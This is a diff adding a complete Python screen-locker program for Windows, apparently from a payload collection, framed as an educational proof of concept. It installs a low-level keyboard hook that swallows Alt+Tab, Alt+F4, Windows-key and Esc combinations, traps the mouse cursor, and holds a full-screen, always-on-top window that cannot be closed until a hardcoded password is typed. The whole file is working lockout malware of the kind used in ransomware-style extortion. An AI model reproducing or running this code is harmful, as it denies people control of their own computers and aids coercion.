@@ -1,0 +1,119 @@
+import ctypes
+import ctypes.wintypes
+import threading
+import os
+from tkinter import Tk, Entry, Label, StringVar, Frame
+
+# Screen Locker POC (.pyz) - PayloadParadise
+# Uses ctypes Win32 API. FOR EDUCATIONAL PURPOSES ONLY.
+
+user32 = ctypes.windll.user32
+kernel32 = ctypes.windll.kernel32
+
+WH_KEYBOARD_LL = 13
+WM_KEYDOWN = 0x0100
+WM_SYSKEYDOWN = 0x0104
+HC_ACTION = 0
+LRESULT = ctypes.c_long
+ULONG_PTR = ctypes.POINTER(ctypes.c_ulong)
+HOOKPROC = ctypes.WINFUNCTYPE(LRESULT, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)
+
+class KBDLLHOOKSTRUCT(ctypes.Structure):
+    _fields_ = [
+        ("vkCode", ctypes.wintypes.DWORD), ("scanCode", ctypes.wintypes.DWORD),
+        ("flags", ctypes.wintypes.DWORD), ("time", ctypes.wintypes.DWORD),
+        ("dwExtraInfo", ULONG_PTR),
+    ]
+
+UNLOCK_PASSWORD = "root"
+unlocked = False
+
+def block_keys_callback(nCode, wParam, lParam):
+    if nCode == HC_ACTION:
+        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
+        vk = kb.vkCode
+        alt = (user32.GetAsyncKeyState(0x12) & 0x8000) != 0
+        ctrl = (user32.GetAsyncKeyState(0x11) & 0x8000) != 0
+        if (alt and vk == 0x09) or (alt and vk == 0x73) or vk in (0x5B, 0x5C):
+            return 1
+        if (ctrl and vk == 0x1B) or (alt and vk == 0x1B):
+            return 1
+    return user32.CallNextHookEx(None, nCode, wParam, lParam)
+
+_block_callback = HOOKPROC(block_keys_callback)
+
+def install_keyboard_block():
+    hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _block_callback, kernel32.GetModuleHandleW(None), 0)
+    if not hook: return
+    msg = ctypes.wintypes.MSG()
+    while not unlocked:
+        if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
+            user32.TranslateMessage(ctypes.byref(msg))
+            user32.DispatchMessageW(ctypes.byref(msg))
+        else:
+            kernel32.Sleep(10)
+    user32.UnhookWindowsHookEx(hook)
+
+def confine_cursor(w, h):
+    class RECT(ctypes.Structure):
+        _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long), ("right", ctypes.c_long), ("bottom", ctypes.c_long)]
+    cx, cy, m = w // 2, h // 2, 200
+    rect = RECT(cx - m, cy - m, cx + m, cy + m)
+    while not unlocked:
+        user32.ClipCursor(ctypes.byref(rect))
+        kernel32.Sleep(100)
+    user32.ClipCursor(None)
+
+def create_locker():
+    global unlocked
+    root = Tk()
+    root.title("")
+    width, height = root.winfo_screenwidth(), root.winfo_screenheight()
+    root.attributes("-fullscreen", True)
+    root.attributes("-topmost", True)
+    root.configure(bg="#1a1a2e")
+    root.overrideredirect(True)
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+
+    frame = Frame(root, bg="#16213e", padx=40, pady=40)
+    frame.place(relx=0.5, rely=0.5, anchor="center")
+
+    Label(frame, text="🔒 SYSTEM LOCKED", font=("Segoe UI", 28, "bold"), fg="#e94560", bg="#16213e").pack(pady=(0, 20))
+    Label(frame, text="Enter the password to unlock:", font=("Segoe UI", 14), fg="#a8a8b3", bg="#16213e").pack(pady=(0, 10))
+
+    pw = StringVar()
+    entry = Entry(frame, textvariable=pw, font=("Consolas", 16), show="●", width=25, bg="#0f3460", fg="#ffffff", insertbackground="#e94560", relief="flat", justify="center")
+    entry.pack(pady=(0, 15), ipady=8)
+    entry.focus_force()
+
+    status = StringVar(value="")
+    Label(frame, textvariable=status, font=("Segoe UI", 11), fg="#e94560", bg="#16213e").pack()
+
+    def check(event=None):
+        global unlocked
+        if pw.get() == UNLOCK_PASSWORD:
+            unlocked = True
+            user32.ClipCursor(None)
+            root.destroy()
+        else:
+            status.set("❌ Incorrect password. Try again.")
+            pw.set("")
+            entry.focus_force()
+
+    entry.bind("<Return>", check)
+
+    def enforce():
+        if not unlocked:
+            root.attributes("-topmost", True)
+            root.focus_force()
+            entry.focus_force()
+            root.lift()
+            root.after(500, enforce)
+    enforce()
+
+    threading.Thread(target=install_keyboard_block, daemon=True).start()
+    threading.Thread(target=confine_cursor, args=(width, height), daemon=True).start()
+    root.mainloop()
+
+if __name__ == "__main__":
+    create_locker()
